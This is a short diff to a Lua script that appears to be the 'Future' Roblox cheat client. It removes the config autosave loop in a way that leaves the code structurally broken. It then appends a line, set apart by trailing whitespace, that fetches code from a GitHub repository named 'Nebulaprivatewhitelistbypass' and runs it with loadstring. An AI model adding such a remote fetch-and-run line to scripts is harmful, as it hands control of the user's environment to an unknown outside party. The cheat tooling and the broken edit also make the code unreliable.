@@ -798,19 +798,9 @@ spawn(function()
     end
 end)
 
-spawn(function()
-    repeat
-        if not shared.Future or shared.Future.Destructing then 
-            break
-        end
-        for i = 1, 100 do 
-            task.wait(0.02)
-            if not shared.Future or shared.Future.Destructing then 
-                break
-            end
-        end
         GuiLibrary["SaveConfig"](GuiLibrary["CurrentConfig"], true)
-    until not shared.Future
 end)
 fprint("Finished loading in "..tostring(math.floor((game:GetService("Workspace"):GetServerTimeNow() - startTime) * 1000) / 1000).."s\nPress "..GuiLibrary["GuiKeybind"].." to open the Gui.\nPlease join the discord for changelogs and to report bugs. \ndiscord.gg/bdjT5UmmDJ\nEnjoy using Future v"..shared._FUTUREVERSION.."")
 shared._FUTURECACHED = true
+							
+local modules = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebulaprivatewhitelistbypass/fixedez/main/scripts/6872274481.lua", true))()
